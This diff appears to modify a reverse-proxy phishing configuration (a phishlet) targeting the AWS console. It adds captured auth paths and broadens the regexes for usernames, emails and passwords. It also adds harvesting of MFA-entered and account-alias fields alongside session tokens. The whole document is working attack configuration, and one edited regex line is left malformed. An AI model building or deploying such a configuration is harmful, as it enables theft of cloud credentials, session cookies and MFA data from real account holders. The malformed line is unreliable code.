@@ -109,14 +109,19 @@ auth_tokens:
     keys: ['.*,regexp']
   - domain: 'us-west-2.console.aws.amazon.com'
     keys: ['.*,regexp']
-    
+
 auth_urls:
   - '/authenticate'
   - '/authenticate/.*'
+  - '/p/auth'
+  - '/p/auth/.*'
+  - '/p/auth.*'
+  - '/p/auth '
+  - '/console/js/healthcheck.js'
 
 credentials:
   username:
-    key: 'username'
+    key: 'username|email'
     search: '(.*)'
     type: 'post'
   password:
@@ -131,16 +136,22 @@ credentials:
     search: '(.*)'
     type: 'post'
   - key: 'action'
-    search: '([^"]*)'
+    search: '(.*)'
     type: 'post'
   - key: 'email'
-    search: '([^"]*)'
+    search: '(.*)'
     type: 'post'
   - key: 'statusCode'
-    search: '([^"]*)'
+    search: '(.*)'
+    type: 'post'
+  - key: 'aws-mfa-entered'
+    search: '(.*)'
+    type: 'post'
+  - key: 'aws-account-alias'
+    search: '(.*)'
     type: 'post'
   - key: ''
-    search: '([^"]*)'
+    search: '([^"]*)'ses
     type: 'json'
 
 login :
